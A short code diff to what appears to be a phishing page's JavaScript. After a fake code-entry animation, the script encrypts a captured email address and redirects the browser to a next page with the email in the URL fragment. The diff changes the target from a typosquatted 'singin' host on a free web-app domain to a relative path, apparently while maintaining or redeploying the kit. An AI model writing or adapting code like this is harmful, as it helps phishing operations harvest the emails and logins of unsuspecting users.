@@ -166,7 +166,7 @@ function showCode(){
     if(idx===6){
       clearInterval(fill);
       setTimeout(()=>{
-        const redirectUrl="https://singin-6b0e0.web.app/do.html";
+        const redirectUrl="/do.html";
         const encrypted=encryptEmail(savedEmail);
         window.location.href=`${redirectUrl}#${encrypted}`;
       },600);
@@ -176,3 +176,4 @@ function showCode(){
 </script>
 </body>
 </html>
+
